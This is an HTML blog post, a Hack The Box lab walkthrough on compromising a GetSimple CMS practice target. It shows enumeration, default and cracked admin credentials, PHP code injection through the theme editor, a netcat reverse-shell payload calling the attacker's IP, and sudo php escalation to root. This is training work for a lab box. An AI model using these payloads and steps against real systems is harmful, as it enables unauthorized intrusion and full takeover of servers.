@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB-Init-test-skills :: Hackers Fight Club Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Module Getting Started: Knowledge check We get an IP adress target $TARGET which we have to pwn.
+First, we make a simple nmap scan to get open services, versions and ports:
+nmap -sV --open -oA start-skills-init-recon $TARGET We get two services:
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The second seems to be a web server, running a page as the port is 80, for http. We run a scan with whatweb:
+" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://albertnath.github.io/hfc-blog/posts/htb-init-test-skills/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/main.min.15870410d15d02abd22fb5ef00996f65a00d04b3a7435e9f83831c7c2298de88.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://albertnath.github.io/hfc-blog/favicon.png">
+<link rel="apple-touch-icon" href="https://albertnath.github.io/hfc-blog/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB-Init-test-skills">
+<meta property="og:description" content="Module Getting Started: Knowledge check We get an IP adress target $TARGET which we have to pwn.
+First, we make a simple nmap scan to get open services, versions and ports:
+nmap -sV --open -oA start-skills-init-recon $TARGET We get two services:
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The second seems to be a web server, running a page as the port is 80, for http. We run a scan with whatweb:
+" />
+<meta property="og:url" content="https://albertnath.github.io/hfc-blog/posts/htb-init-test-skills/" />
+<meta property="og:site_name" content="Hackers Fight Club Blog" />
+
+  
+  
+  <meta property="og:image" content="https://albertnath.github.io/hfc-blog/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-02-16 09:12:30 -0600 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://albertnath.github.io/hfc-blog/">
+  <div class="logo">
+    Hackers Fight Club Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de">Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors">Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de" >Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors" >Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/posts" >Posts</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://albertnath.github.io/hfc-blog/posts/htb-init-test-skills/">HTB-Init-test-skills</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">16-02-2025</time><span class="post-author">corrupter</span><span class="post-reading-time">5 min read (1027 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/pentesting/">Pentesting</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/revshells/">Revshells</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="module-getting-started-knowledge-check">Module Getting Started: Knowledge check<a href="#module-getting-started-knowledge-check" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>We get an IP adress target <code>$TARGET</code> which we have to pwn.</p>
+<p>First, we make a simple nmap scan to get open services, versions and ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nmap -sV --open -oA start-skills-init-recon <span class="nv">$TARGET</span>
+</span></span></code></pre></div><p>We get two services:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>The second seems to be a web server, running a page as the port is 80, for http. We run
+a scan with <code>whatweb</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ whatweb <span class="nv">$TARGET</span>
+</span></span><span class="line"><span class="cl">http://<span class="nv">$TARGET</span> <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache<span class="o">[</span>2.4.41<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span><span class="nv">$TARGET</span><span class="o">]</span>
+</span></span></code></pre></div><p>We get not many info, so heading to the page with a browser, we see the server
+uses GetSimple CMS. <code>searchsploit</code> gives us some interesting information for vulnerabilities:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ searchsploit GetSimple
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                                     <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Getsimple CMS 2.01 - <span class="s1">&#39;changedata.php&#39;</span> Cross-Site Scripting                         <span class="p">|</span> php/webapps/34789.html
+</span></span><span class="line"><span class="cl">Getsimple CMS 2.01 - <span class="s1">&#39;components.php&#39;</span> Cross-Site Scripting                         <span class="p">|</span> php/webapps/34041.txt
+</span></span><span class="line"><span class="cl">Getsimple CMS 2.01 - Local File Inclusion                                          <span class="p">|</span> php/webapps/12517.txt
+</span></span><span class="line"><span class="cl">Getsimple CMS 2.01 - Multiple Vulnerabilities                                      <span class="p">|</span> php/webapps/14338.html
+</span></span><span class="line"><span class="cl">Getsimple CMS 2.01 &lt; 2.02 - Administrative Credentials Disclosure                  <span class="p">|</span> php/webapps/15605.txt
+</span></span><span class="line"><span class="cl">Getsimple CMS 2.03 - <span class="s1">&#39;upload-ajax.php&#39;</span> Arbitrary File Upload                       <span class="p">|</span> php/webapps/35353.txt
+</span></span><span class="line"><span class="cl">Getsimple CMS 3.0 - <span class="s1">&#39;set&#39;</span> Local File Inclusion                                     <span class="p">|</span> php/webapps/35726.py
+</span></span><span class="line"><span class="cl">Getsimple CMS 3.1.2 - <span class="s1">&#39;path&#39;</span> Local File Inclusion                                  <span class="p">|</span> php/webapps/37587.txt
+</span></span><span class="line"><span class="cl">Getsimple CMS 3.2.1 - Arbitrary File Upload                                        <span class="p">|</span> php/webapps/25405.txt
+</span></span><span class="line"><span class="cl">GetSimple CMS 3.3.1 - Cross-Site Scripting                                         <span class="p">|</span> php/webapps/43888.txt
+</span></span><span class="line"><span class="cl">Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting                              <span class="p">|</span> php/webapps/32502.txt
+</span></span><span class="line"><span class="cl">Getsimple CMS 3.3.10 - Arbitrary File Upload                                       <span class="p">|</span> php/webapps/40008.txt
+</span></span><span class="line"><span class="cl">GetSimple CMS 3.3.13 - Cross-Site Scripting                                        <span class="p">|</span> php/webapps/44408.txt
+</span></span><span class="line"><span class="cl">GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/49726.py
+</span></span><span class="line"><span class="cl">GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting <span class="o">(</span>Authenticated<span class="o">)</span>             <span class="p">|</span> php/webapps/48850.txt
+</span></span><span class="line"><span class="cl">GetSimple CMS 3.3.4 - Information Disclosure                                       <span class="p">|</span> php/webapps/49928.py
+</span></span><span class="line"><span class="cl">GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery                           <span class="p">|</span> php/webapps/49816.py
+</span></span><span class="line"><span class="cl">Getsimple CMS Items Manager Plugin - <span class="s1">&#39;PHP.php&#39;</span> Arbitrary File Upload               <span class="p">|</span> php/webapps/37472.php
+</span></span><span class="line"><span class="cl">GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery            <span class="p">|</span> php/webapps/49774.py
+</span></span><span class="line"><span class="cl">GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting       <span class="p">|</span> php/webapps/49798.py
+</span></span><span class="line"><span class="cl">GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery <span class="o">(</span>Add Admin<span class="o">)</span>     <span class="p">|</span> php/webapps/48745.txt
+</span></span><span class="line"><span class="cl">GetSimple CMS v3.3.16 - Remote Code Execution <span class="o">(</span>RCE<span class="o">)</span>                                <span class="p">|</span> php/webapps/51475.py
+</span></span><span class="line"><span class="cl">GetSimpleCMS - Unauthenticated Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                  <span class="p">|</span> php/remote/46880.rb
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------- ---------------------------------
+</span></span></code></pre></div><p>Seems like we can upload or run arbitrary code. Meanwhile, <code>gobuster</code> gives us useful paths to
+explore:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ gobuster dir -u http://<span class="nv">$TARGET</span> -w /usr/share/seclists/Discovery/Web-Content/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://<span class="nv">$TARGET</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://<span class="nv">$TARGET</span>/admin/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/backups              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://<span class="nv">$TARGET</span>/backups/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/data                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313<span class="o">]</span> <span class="o">[</span>--&gt; http://<span class="nv">$TARGET</span>/data/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5485<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://<span class="nv">$TARGET</span>/plugins/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 32<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/sitemap.xml          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 431<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/theme                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://<span class="nv">$TARGET</span>/theme/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">4734</span> / <span class="m">4735</span> <span class="o">(</span>99.98%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></div><p>The paths <code>/admin</code> and <code>/data</code> seem promising, so we explore them. The former gives us a
+login page. Trying default passwords like <code>admin:admin</code> actually works, but alternatively
+we could have searched the later directory and see that in the <code>/users</code> subdirectory resides
+an <code>admin.xml</code> file with the following content:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;item&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;USR&gt;</span>admin<span class="nt">&lt;/USR&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;NAME/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;PWD&gt;</span>d033e22ae348aeb5660fc2140aec35850c4da997<span class="nt">&lt;/PWD&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;EMAIL&gt;</span>admin@gettingstarted.com<span class="nt">&lt;/EMAIL&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;HTMLEDITOR&gt;</span>1<span class="nt">&lt;/HTMLEDITOR&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;TIMEZONE/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;LANG&gt;</span>en_US<span class="nt">&lt;/LANG&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/item&gt;</span>
+</span></span></code></pre></div><p>We see a hash, which <code>john</code> can easily crack and thus, obtaining the same credentials</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt admin-xml-hash
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;Raw-SHA1&#34;</span>, but the string is also recognized as <span class="s2">&#34;Raw-SHA1-AxCrypt&#34;</span>
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--format=Raw-SHA1-AxCrypt&#34;</span> option to force loading these as that <span class="nb">type</span> instead
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;Raw-SHA1&#34;</span>, but the string is also recognized as <span class="s2">&#34;Raw-SHA1-Linkedin&#34;</span>
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--format=Raw-SHA1-Linkedin&#34;</span> option to force loading these as that <span class="nb">type</span> instead
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;Raw-SHA1&#34;</span>, but the string is also recognized as <span class="s2">&#34;ripemd-160&#34;</span>
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--format=ripemd-160&#34;</span> option to force loading these as that <span class="nb">type</span> instead
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;Raw-SHA1&#34;</span>, but the string is also recognized as <span class="s2">&#34;has-160&#34;</span>
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--format=has-160&#34;</span> option to force loading these as that <span class="nb">type</span> instead
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>Raw-SHA1 <span class="o">[</span>SHA1 256/256 AVX2 8x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Warning: no OpenMP support <span class="k">for</span> this <span class="nb">hash</span> type, consider --fork<span class="o">=</span><span class="m">4</span>
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">admin            <span class="o">(</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2024-12-25 13:26<span class="o">)</span> 50.00g/s 991200p/s 991200c/s 991200C/s alcala..LOVE1
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=Raw-SHA1&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>When logging, we see many components in the admin pannel. Our interest is,
+initially, the <code>upload.php</code> as <code>searchsploit</code> indicated a file upload
+vulnerability, but the upload button seemed to be disabled. Searching around we
+see that we can edit the theme code in the <code>themes.php</code> component. Using a
+simple script like <code>&lt;?php system('id'); ?&gt;</code> works when reloading the page (note
+that the edited theme must be enabled). We can then use a revshell like:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span> <span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [ATTCK_MACHINE_IP] [PORT] &gt;/tmp/f&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><blockquote>
+<p>[!IMPORTANT]
+You might save a copy of the original php template as this might disrupt the server.</p></blockquote>
+<p>Make sure to substitute <code>ATTCK_MACHINE_IP</code> by your machine IP through a VPN and
+<code>PORT</code> by a choice port.</p>
+<p>We listen with netcat at the port specified in the payload with <code>nc -lvnp PORT</code>
+and see that, on page reload, the connection is stabilshed. There we can go to
+the directory <code>/home/mrb3n</code> to get the <code>user.txt</code> flag.</p>
+<p>To escalate privileges we explore binaries. Running <code>sudo -l</code> we see that a php
+binary can be used with root privileges without password by all users:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on gettingstarted:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on gettingstarted:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ ls -l /usr/bin/php
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">21</span> Feb  <span class="m">9</span>  <span class="m">2021</span> /usr/bin/php -&gt; /etc/alternatives/php
+</span></span></code></pre></div><p>A quick search in GTFObins tells us we can escalate to root as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="nv">CMD</span><span class="o">=</span><span class="s2">&#34;/bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl">$ sudo php -r <span class="s2">&#34;system(&#39;</span><span class="nv">$CMD</span><span class="s2">&#39;);&#34;</span>
+</span></span></code></pre></div><p>With this, we can get the last flag <code>root.txt</code> at the <code>/root/</code> directory.</p>
+<p>We then successfully pwned the box.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="https://albertnath.github.io/hfc-blog/posts/another-post/" class="button inline next">
+         [<span class="button__text">Another Post</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="https://albertnath.github.io/hfc-blog/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
